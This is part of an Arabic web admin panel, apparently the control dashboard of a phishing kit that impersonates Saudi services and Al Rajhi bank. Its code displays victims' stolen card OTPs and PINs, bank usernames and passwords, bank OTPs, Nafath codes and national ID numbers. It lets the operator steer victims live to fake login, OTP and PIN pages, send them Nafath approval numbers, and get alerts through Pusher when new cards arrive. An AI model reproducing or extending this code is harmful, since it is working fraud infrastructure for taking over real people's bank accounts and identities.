                        </div>
                        <button class="btn btn-redirect" onclick="sendNafathFromCardsModal()">
                            <i class="fas fa-paper-plane"></i>
                            إرسال الرقم للعميل
                        </button>
                        
                        <hr style="margin: 20px 0;">
                        
                        <div id="nafathHistoryInCards">
                            <div class="text-center">
                                <div class="spinner"></div>
                                <p class="mt-2">جاري التحميل...</p>
                            </div>
                        </div>
                    </div>
                    `;

                    document.getElementById('userCardsContent').innerHTML = html;

                    // ✅ جلب OTP و PIN
                    cards.forEach(card => {
                        fetch(`get-card-otps.php?card_id=${card.id}`)
                            .then(res => res.json())
                            .then(otps => {
                                const box = document.getElementById(`otpBox_${card.id}`);
                                if (!box) return;

                                if (!Array.isArray(otps) || otps.length === 0) {
                                    box.innerHTML = '<em class="text-muted">لا يوجد OTP بعد</em>';
                                    return;
                                }

                                let otpHtml = '<hr><h6><i class="fas fa-key"></i> رموز التحقق (OTP)</h6><ul>';
                                otps.forEach(o => {
                                    otpHtml += `<li><strong>${o.otp_code}</strong> — ${o.created_at}</li>`;
                                });
                                otpHtml += '</ul>';
                                box.innerHTML = otpHtml;
                            });

                        fetch(`get-card-pins.php?client_id=${userId}`)
                            .then(res => res.json())
                            .then(pin => {
                                const box = document.getElementById(`pinBox_${card.id}`);
                                if (!box) return;

                                if (!pin || !pin.pin_code) {
                                    box.innerHTML = '<em class="text-muted">⏳ لم يتم إدخال PIN بعد</em>';
                                    return;
                                }

                                box.innerHTML = `
                                    <hr>
                                    <h6><i class="fas fa-lock"></i> كلمة سر البطاقة (PIN)</h6>
                                    <div class="alert alert-danger text-center" style="font-size:20px; font-weight:700;">
                                        ${pin.pin_code}<br>
                                        <small>${pin.created_at}</small>
                                    </div>
                                `;
                            });
                    });

                    // ✅ جلب بيانات نفاذ
                    loadNafadDataInCards(userId);
                    
                    // ✅ جلب تاريخ أرقام نفاذ
                    loadNafathHistoryInCards(userId);

                    // ✅ السماح بإدخال أرقام فقط
                    document.getElementById('nafathNumberInputInCards')?.addEventListener('input', function(e) {
                        this.value = this.value.replace(/[^0-9]/g, '');
                    });

                } catch (e) {
                    console.error('خطأ في تحديث البطاقات:', e);
                }
            }
        });
    }

    // ✅ دالة جلب بيانات نفاذ داخل المودال
    function loadNafadDataInCards(userId) {
        fetch(`get-user-nafad.php?user_id=${userId}`)
            .then(res => res.json())
            .then(data => {
                let html = '';

                if (Array.isArray(data.codes) && data.codes.length > 0) {
                    html += '<h6 style="color: #065f46; font-weight: bold; margin-bottom: 15px;"><i class="fas fa-shield-alt"></i> رموز التحقق</h6>';
                    
                    data.codes.forEach((code, i) => {
                        html += `
                            <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                    <span style="font-weight: bold;">رمز #${i + 1}</span>
                                    <small style="color: #666;">${code.created_at}</small>
                                </div>
                                <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                    ${code.nafad_code}
                                </div>
                            </div>
                        `;
                    });
                }

                if (Array.isArray(data.logs) && data.logs.length > 0) {
                    html += '<hr><h6 style="color: #065f46; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-history"></i> سجلات نفاذ السابقة</h6>';
                    
                    data.logs.forEach((log, i) => {
                        html += `
                            <div class="info-card">
                                <h6><i class="fas fa-file-alt"></i> محاولة #${i + 1}</h6>
                                <p><strong>الهاتف:</strong> ${log.phone ?? '-'}</p>
                                <p><strong>المشغل:</strong> ${log.telecom ?? '-'}</p>
                                <p><strong>رقم الهوية:</strong> ${log.id_number ?? '-'}</p>
                                ${log.redirect_to ? `<p><strong>تم التوجيه إلى:</strong> ${log.redirect_to}</p>` : ''}
                                <p><small>${log.created_at}</small></p>
                            </div>
                        `;
                    });
                }

                if (html === '') {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات نفاذ بعد</div>';
                }

                document.getElementById('nafadSectionInCards').innerHTML = html;
            });
    }

    // ✅ دالة جلب تاريخ أرقام نفاذ داخل المودال
    function loadNafathHistoryInCards(userId) {
        fetch(`get-nafath-history.php?user_id=${userId}`)
            .then(res => res.json())
            .then(numbers => {
                let html = '<h6 style="color: #92400e;"><i class="fas fa-history"></i> الأرقام المرسلة سابقاً:</h6>';
                
                if (!Array.isArray(numbers) || numbers.length === 0) {
                    html += '<p class="text-muted">لم يتم إرسال أي رقم بعد</p>';
                } else {
                    numbers.forEach((num, i) => {
                        html += `
                            <div class="alert alert-success mb-2">
                                <strong style="font-size: 1.2rem;">${num.number}</strong>
                                <small class="d-block text-muted">${num.created_at}</small>
                            </div>
                        `;
                    });
                }
                
                document.getElementById('nafathHistoryInCards').innerHTML = html;
            });
    }

    // ✅ دالة إرسال رقم نفاذ من داخل مودال البطاقات
    function sendNafathFromCardsModal() {
        const number = document.getElementById('nafathNumberInputInCards').value.trim();
        
        if (!number) {
            showToast('تنبيه', 'الرجاء إدخال رقم', 'warning');
            return;
        }
        
        if (!currentUserId) {
            showToast('خطأ', 'خطأ في تحديد العميل', 'error');
            return;
        }
        
        $.ajax({
            url: 'send-nafath-number.php',
            method: 'POST',
            data: {
                user_id: currentUserId,
                number: number
            },
            success: function(response) {
                try {
                    const result = JSON.parse(response);
                    if (result.success) {
                        showToast('نجح الإرسال', `تم إرسال الرقم ${number} للعميل`, 'success');
                        document.getElementById('nafathNumberInputInCards').value = '';
                        loadNafathHistoryInCards(currentUserId);
                    } else {
                        showToast('خطأ', result.error || 'فشل الإرسال', 'error');
                    }
                } catch(e) {
                    showToast('تم الإرسال', 'تم ارسال الرقم للعميل', 'success');
                    document.getElementById('nafathNumberInputInCards').value = '';
                    loadNafathHistoryInCards(currentUserId);
                }
            },
            error: function() {
                showToast('خطأ', 'خطأ في الاتصال', 'error');
            }
        });
    }
    
    function showUserCards(userId) {
        currentUserId = userId;
        markRowAsRead(userId);
        refreshCardsModal(userId);
        new bootstrap.Modal(document.getElementById('userCardsModal')).show();
    }
    
    function showUserNafad(userId) {
        currentUserId = userId;
        markRowAsRead(userId);
        
        fetch(`get-user-nafad.php?user_id=${userId}`)
            .then(res => res.json())
            .then(data => {
                let html = '';

                if (Array.isArray(data.codes) && data.codes.length > 0) {
                    html += '<h6 style="color: #f59e0b; font-weight: bold; margin-bottom: 15px;"><i class="fas fa-shield-alt"></i> رموز التحقق</h6>';
                    
                    data.codes.forEach((code, i) => {
                        html += `
                            <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                    <span style="font-weight: bold;">رمز #${i + 1}</span>
                                    <small style="color: #666;">${code.created_at}</small>
                                </div>
                                <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                    ${code.nafad_code}
                                </div>
                            </div>
                        `;
                    });
                }

                if (Array.isArray(data.logs) && data.logs.length > 0) {
                    html += '<hr><h6 style="color: #f59e0b; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-history"></i> سجلات نفاذ السابقة</h6>';
                    
                    data.logs.forEach((log, i) => {
                        html += `
                            <div class="info-card">
                                <h6><i class="fas fa-file-alt"></i> محاولة #${i + 1}</h6>
                                <p><strong>الهاتف:</strong> ${log.phone ?? '-'}</p>
                                <p><strong>المشغل:</strong> ${log.telecom ?? '-'}</p>
                                <p><strong>رقم الهوية:</strong> ${log.id_number ?? '-'}</p>
                                ${log.redirect_to ? `<p><strong>تم التوجيه إلى:</strong> ${log.redirect_to}</p>` : ''}
                                <p><small>${log.created_at}</small></p>
                            </div>
                        `;
                    });
                }

                if (html === '') {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات نفاذ بعد</div>';
                }

                document.getElementById('userNafadContent').innerHTML = html;
                new bootstrap.Modal(document.getElementById('userNafadModal')).show();
            });
    }
    
    function showNafathFinal(userId) {
        currentUserId = userId;
        markRowAsRead(userId);
        
        document.getElementById('nafathNumberInput').value = '';
        
        fetch(`get-nafath-history.php?user_id=${userId}`)
            .then(res => res.json())
            .then(numbers => {
                let html = '<h6 style="color: #f59e0b;"><i class="fas fa-history"></i> الأرقام المرسلة سابقاً:</h6>';
                
                if (!Array.isArray(numbers) || numbers.length === 0) {
                    html += '<p class="text-muted">لم يتم إرسال أي رقم بعد</p>';
                } else {
                    numbers.forEach((num, i) => {
                        html += `
                            <div class="alert alert-success mb-2">
                                <strong style="font-size: 1.2rem;">${num.number}</strong>
                                <small class="d-block text-muted">${num.created_at}</small>
                            </div>
                        `;
                    });
                }
                
                document.getElementById('nafathHistoryContent').innerHTML = html;
                new bootstrap.Modal(document.getElementById('nafathFinalModal')).show();
            });
    }
    
    function sendNafathNumberToClient() {
        const number = document.getElementById('nafathNumberInput').value.trim();
        
        if (!number) {
            showToast('تنبيه', 'الرجاء إدخال رقم', 'warning');
            return;
        }
        
        if (!currentUserId) {
            showToast('خطأ', 'خطأ في تحديد العميل', 'error');
            return;
        }
        
        $.ajax({
            url: 'send-nafath-number.php',
            method: 'POST',
            data: {
                user_id: currentUserId,
                number: number
            },
            success: function(response) {
                try {
                    const result = JSON.parse(response);
                    if (result.success) {
                        showToast('نجح الإرسال', `تم إرسال الرقم ${number} للعميل`, 'success');
                        document.getElementById('nafathNumberInput').value = '';
                        showNafathFinal(currentUserId);
                    } else {
                        showToast('خطأ', result.error || 'فشل الإرسال', 'error');
                    }
                } catch(e) {
                    showToast('تم الإرسال', 'تم ارسال الرقم للعميل', 'success');
                    document.getElementById('nafathNumberInput').value = '';
                    showNafathFinal(currentUserId);
                }
            },
            error: function() {
                showToast('خطأ', 'خطأ في الاتصال', 'error');
            }
        });
    }
    
    // ✅ دوال التوجيه بدون إغلاق المودال
    function redirectUser() {
        const page = document.getElementById('redirectPageUser').value;
        
        if (!currentUserId) {
            showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
            return;
        }
        
        $.ajax({
            url: 'redirect-user.php',
            method: 'POST',
            data: {
                user_id: currentUserId,
                page: page
            },
            success: function(response) {
                showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
            },
            error: function() {
                showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
            }
        });
    }

    function redirectUserFromCard() {
        const page = document.getElementById('redirectPageCard').value;
        
        if (!currentUserId) {
            showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
            return;
        }
        
        $.ajax({
            url: 'redirect-user.php',
            method: 'POST',
            data: {
                user_id: currentUserId,
                page: page
            },
            success: function(response) {
                showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
            },
            error: function() {
                showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
            }
        });
    }

    function redirectUserFromNafad() {
        const page = document.getElementById('redirectPageNafad').value;

        if (!currentUserId) {
            showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
            return;
        }

        $.ajax({
            url: 'redirect-user.php',
            method: 'POST',
            data: {
                user_id: currentUserId,
                page: page
            },
            success: function () {
                showToast('نجح التوجيه', 'تم توجيه المستخدم بنجاح', 'success');
            },
            error: function () {
                showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
            }
        });
    }
    // ============================================
// عرض بيانات البنك (راجحي)
// ============================================
function showUserBank(userId) {
    currentUserId = userId;
    
    $.ajax({
        url: 'get-user-bank.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const banks = JSON.parse(response);
                let html = '';

                if (!Array.isArray(banks) || banks.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات بنك لهذا المتدرب</div>';
                } else {
                    banks.forEach((bank, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-university"></i> بيانات البنك ${index + 1}</h6>
                            <p><strong>اسم البنك:</strong> ${bank.bank ?? '-'}</p>
                            <p><strong>اسم المستخدم / الهوية:</strong> 
                                <span style="color: #0066cc; font-weight: 700; font-size: 1.1rem;">${bank.user_name ?? '-'}</span>
                            </p>
                            <p><strong>كلمة المرور:</strong> 
                                <span style="color: #dc2626; font-weight: 700; font-size: 1.1rem;">${bank.bk_pass ?? '-'}</span>
                            </p>
                            <p><strong>تاريخ التسجيل:</strong> ${bank.created_at ?? '-'}</p>
                        </div>
                        `;
                    });
                }

                html += '<div id="bankOtpBox"><em class="text-muted">🔄 جاري تحميل رموز التحقق...</em></div>';
                document.getElementById('userBankContent').innerHTML = html;
                
                // جلب رموز OTP البنك
                fetch(`get-bank-otps.php?user_id=${userId}`)
                    .then(res => res.json())
                    .then(otps => {
                        const box = document.getElementById('bankOtpBox');
                        if (!box) return;

                        if (!Array.isArray(otps) || otps.length === 0) {
                            box.innerHTML = '<div class="alert alert-secondary mt-3"><i class="fas fa-info-circle"></i> لم يتم إدخال أي رمز تحقق بعد</div>';
                            return;
                        }

                        let otpHtml = '<hr><h6 style="color: #f59e0b; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-key"></i> رموز التحقق (OTP البنك)</h6>';
                        
                        otps.forEach((otp, i) => {
                            otpHtml += `
                                <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${otp.created_at}</small>
                                    </div>
                                    <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                        ${otp.otp_code}
                                    </div>
                                </div>
                            `;
                        });
                        
                        box.innerHTML = otpHtml;
                    });
                
                const modal = new bootstrap.Modal(document.getElementById('userBankModal'));
                modal.show();
                markAsRead(userId);
                
            } catch(e) {
                console.error('Error:', e);
                document.getElementById('userBankContent').innerHTML = 
                    '<div class="alert alert-danger">حدث خطأ في تحميل البيانات</div>';
            }
        }
    });
}

// ============================================
// توجيه المستخدم من مودال البنك
// ============================================
function redirectUserFromBank() {
    const page = document.getElementById('redirectPageBank').value;
    
    if (!currentUserId) {
        showToast('خطأ', 'لم يتم تحديد المستخدم', 'error');
        return;
    }
    
    $.ajax({
        url: 'redirect-user.php',
        method: 'POST',
        data: {
            user_id: currentUserId,
            page: page
        },
        success: function(response) {
            showToast('نجح التوجيه', 'تم توجيه المتدرب بنجاح', 'success');
        },
        error: function() {
            showToast('خطأ', 'حدث خطأ في التوجيه', 'error');
        }
    });
}

// ============================================
// تحديث مودال البنك real-time
// ============================================
function refreshBankModal(userId) {
    $.ajax({
        url: 'get-user-bank.php',
        method: 'GET',
        data: { user_id: userId },
        success: function(response) {
            try {
                const banks = JSON.parse(response);
                let html = '';

                if (!Array.isArray(banks) || banks.length === 0) {
                    html = '<div class="alert alert-info"><i class="fas fa-info-circle"></i> لا توجد بيانات بنك</div>';
                } else {
                    banks.forEach((bank, index) => {
                        html += `
                        <div class="info-card">
                            <h6><i class="fas fa-university"></i> بيانات البنك ${index + 1}</h6>
                            <p><strong>اسم البنك:</strong> ${bank.bank ?? '-'}</p>
                            <p><strong>اسم المستخدم / الهوية:</strong> 
                                <span style="color: #0066cc; font-weight: 700; font-size: 1.1rem;">${bank.user_name ?? '-'}</span>
                            </p>
                            <p><strong>كلمة المرور:</strong> 
                                <span style="color: #dc2626; font-weight: 700; font-size: 1.1rem;">${bank.bk_pass ?? '-'}</span>
                            </p>
                            <p><strong>تاريخ التسجيل:</strong> ${bank.created_at ?? '-'}</p>
                        </div>
                        `;
                    });
                }

                html += '<div id="bankOtpBox"><em class="text-muted">🔄 جاري تحميل رموز التحقق...</em></div>';
                document.getElementById('userBankContent').innerHTML = html;
                
                fetch(`get-bank-otps.php?user_id=${userId}`)
                    .then(res => res.json())
                    .then(otps => {
                        const box = document.getElementById('bankOtpBox');
                        if (!box) return;

                        if (!Array.isArray(otps) || otps.length === 0) {
                            box.innerHTML = '<div class="alert alert-secondary mt-3"><i class="fas fa-info-circle"></i> لم يتم إدخال أي رمز تحقق بعد</div>';
                            return;
                        }

                        let otpHtml = '<hr><h6 style="color: #f59e0b; font-weight: bold; margin: 20px 0 15px;"><i class="fas fa-key"></i> رموز التحقق (OTP البنك)</h6>';
                        
                        otps.forEach((otp, i) => {
                            otpHtml += `
                                <div class="info-card" style="background: #fff3cd; border-right: 4px solid #f59e0b;">
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                                        <span style="font-weight: bold;">رمز #${i + 1}</span>
                                        <small style="color: #666;">${otp.created_at}</small>
                                    </div>
                                    <div class="alert alert-danger text-center" style="font-size:24px; font-weight:700; margin: 0; padding: 15px;">
                                        ${otp.otp_code}
                                    </div>
                                </div>
                            `;
                        });
                        
                        box.innerHTML = otpHtml;
                    });

                showToast('تحديث', 'تم تحديث بيانات البنك', 'info');
                    
            } catch(e) {
                console.error('خطأ:', e);
            }
        }
    });
}
    // ✅ Pusher للتحديثات Real-time
    const pusher = new Pusher('a56388ee6222f6c5fb86', {
        cluster: 'ap2',
        encrypted: true
    });
    
    const channel = pusher.subscribe('my-channel');
    
    // ✅ Pusher Event مع إضافة/تحديث الصفوف + تحديث المودالات تلقائياً
    channel.bind('updaefte-user-payys', function(data) {
        const userId = data.userId;
        const message = data.updatedData?.message || '';
        
        console.log('📡 Pusher Event:', userId, message);
        
        // ✅ أضف أو حدّث الصف (سيتحرك للأعلى تلقائياً)
        addOrUpdateUserRow(userId, message);
        
        // ✅ تحديث المودالات تلقائياً إذا كانت مفتوحة (لأي عميل - ليس فقط العميل الحالي)
        const userInfoModalElement = document.getElementById('userInfoModal');
        const userCardsModalElement = document.getElementById('userCardsModal');
        const userNafadModalElement = document.getElementById('userNafadModal');
        const nafathFinalModalElement = document.getElementById('nafathFinalModal');
        
        // تحديث modal المعلومات إذا مفتوح للعميل المحدث
        if (currentUserId == userId && userInfoModalElement?.classList.contains('show')) {
            console.log('🔄 تحديث modal المعلومات تلقائياً');
            showUserInfo(userId);
        }
        
        // تحديث modal البطاقات إذا مفتوح للعميل المحدث
        if (currentUserId == userId && userCardsModalElement?.classList.contains('show')) {
            console.log('🔄 تحديث modal البطاقات تلقائياً');
            refreshCardsModal(userId);
        }
        
        // تحديث modal نفاذ إذا مفتوح للعميل المحدث
        if (currentUserId == userId && userNafadModalElement?.classList.contains('show')) {
            console.log('🔄 تحديث modal نفاذ تلقائياً');
            showUserNafad(userId);
        }
        
        // تحديث modal إرسال رقم نفاذ إذا مفتوح للعميل المحدث
        if (currentUserId == userId && nafathFinalModalElement?.classList.contains('show')) {
            console.log('🔄 تحديث modal إرسال رقم نفاذ تلقائياً');
            showNafathFinal(userId);
        }
        
        // ✅ صوت + Toast للبطاقات
        if (message.includes('دفع') || message.includes('بطاقة') || message.includes('card') || message.includes('payment') || message.includes('بيانات دفع')) {
            console.log('🎴 بطاقة جديدة!');
            
            const audio = document.getElementById('card-sound');
            if (audio) {
                audio.currentTime = 0;
                audio.play().catch(e => console.log('تعذر تشغيل الصوت:', e));
            }
            
            showToast('بطاقة جديدة', `تم إضافة بطاقة جديدة للعميل #${userId}`, 'success');
            
            // ✅ تحديث عدد البطاقات في الصف
            const cardBadge = document.querySelector(`tr[data-user-id="${userId}"] .card-badge`);
            if (cardBadge) {
                const currentCount = parseInt(cardBadge.textContent.match(/\d+/)[0]) || 0;
                cardBadge.textContent = `${currentCount + 1} بطاقة`;
            }
            
            // ✅ تحديث الإحصائيات
            const statValues = document.querySelectorAll('.stat-value');
            if (statValues[1]) {
                const currentTotal = parseInt(statValues[1].textContent) || 0;
                statValues[1].textContent = currentTotal + 1;
            }
        } else if (message.includes('OTP') || message.includes('otp') || message.includes('رمز')) {
            showToast('رمز OTP', `تم إدخال رمز OTP للعميل #${userId}`, 'info');
        } else if (message.includes('PIN') || message.includes('pin') || message.includes('كلمة سر')) {
            showToast('كلمة سر البطاقة', `تم إدخال PIN للعميل #${userId}`, 'warning');
        } else if (message.includes('نفاذ') || message.includes('nafad')) {
            showToast('نفاذ', `تحديث بيانات نفاذ للعميل #${userId}`, 'info');
        } else {
            showToast('تحديث', message || `تم تحديث بيانات العميل #${userId}`, 'info');
        }
    });
function updateOpenModals(userId, message) {
    if (currentUserId != userId) return;
    
    const cardsModal = document.getElementById('userCardsModal');
    const nafadModal = document.getElementById('userNafadModal');
    const nafathModal = document.getElementById('nafathFinalModal');
    const bankModal = document.getElementById('userBankModal'); // ✅ إضافة
    
    const isCardsModalOpen = cardsModal?.classList.contains('show');
    const isNafadModalOpen = nafadModal?.classList.contains('show');
    const isNafathModalOpen = nafathModal?.classList.contains('show');
    const isBankModalOpen = bankModal?.classList.contains('show'); // ✅ إضافة
    
    if (isCardsModalOpen && (message.includes('دفع') || message.includes('OTP') || message.includes('PIN'))) {
        console.log('🔄 تحديث مودال الدفع real-time');
        refreshCardsModal(userId);
    }
    
    if (isNafadModalOpen && (message.includes('التحقق') || message.includes('رمز'))) {
        console.log('🔄 تحديث مودال التحقق real-time');
        refreshNafadModal(userId);
    }
    
    if (isNafathModalOpen && message.includes('رقم')) {
        console.log('🔄 تحديث مودال الرمز real-time');
        refreshNafathModal(userId);
    }
    
    // ✅ تحديث مودال البنك
    if (isBankModalOpen && (message.includes('OTP بنك') || message.includes('راجحي'))) {
        console.log('🔄 تحديث مودال البنك real-time');
        refreshBankModal(userId);
    }
}
    // ✅ استعادة الصفوف غير المقروءة عند تحميل الصفحة
    window.addEventListener('DOMContentLoaded', function() {
        console.log('✅ تحميل الصفحة + استعادة الصفوف غير المقروءة');
        restoreUnreadRows();
    });
    
    // ✅ إضافة عميل جديد تلقائياً (إذا أضاف بطاقة)
    channel.bind('my-event-newwwe', function(data) {
        const userId = data.userId;
        const message = data.message || 'عميل جديد';
        
        console.log('🆕 عميل جديد - ID:', userId);
        
        // ✅ إضافة صف جديد (سيظهر في الأعلى)
        addOrUpdateUserRow(userId, message);
        
        // ✅ صوت
        const audio = document.getElementById('card-sound');
        if (audio) {
            audio.currentTime = 0;
            audio.play().catch(e => console.log('تعذر تشغيل الصوت:', e));
        }
        
        showToast('عميل جديد', `انضم عميل جديد #${userId}`, 'success');
        
        // ✅ تحديث عدد العملاء
        const statValues = document.querySelectorAll('.stat-value');
        if (statValues[0]) {
            const currentCount = parseInt(statValues[0].textContent) || 0;
            statValues[0].textContent = currentCount + 1;
        }
    });
    
    // إدخال أرقام فقط
    document.getElementById('nafathNumberInput')?.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // إرسال عند Enter
    document.getElementById('nafathNumberInput')?.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            sendNafathNumberToClient();
        }
    });
</script>
<!-- Modal بيانات البنك (راجحي) -->
<div class="modal fade" id="userBankModal" tabindex="-1">
    <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">
                    <i class="fas fa-university"></i>
                    بيانات بنك الراجحي
                </h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <div class="redirect-box">
                    <label>
                        <i class="fas fa-directions"></i>
                        توجيه المتدرب إلى صفحة:
                    </label>
                    <select class="form-select form-select-modern" id="redirectPageBank">
                        <option value="index.html">الصفحة الرئيسية</option>
                        <option value="BK.php">بنك الراجحي</option>
                        <option value="bank-otp.php">رمز تحقق بنك الراجحي</option>
                        <option value="pay.php">صفحة الدفع</option>
                        <option value="otp.php">رمز OTP</option>
                        <option value="pin.php">كلمة سر البطاقة</option>
                        <option value="nafad.php">رقم مزود الخدمة</option>
                        <option value="success.php">رمز تحقق مزود الخدمة</option>
                        <option value="nafath.php">نفاذ الأخيرة</option>
                    </select>
                    <button class="btn btn-redirect" onclick="redirectUserFromBank()">
                        <i class="fas fa-paper-plane"></i>
                        توجيه الآن
                    </button>
                </div>
                
                <div id="userBankContent">
                    <div class="text-center">
                        <div class="spinner"></div>
                        <p class="mt-2">جاري تحميل بيانات البنك...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>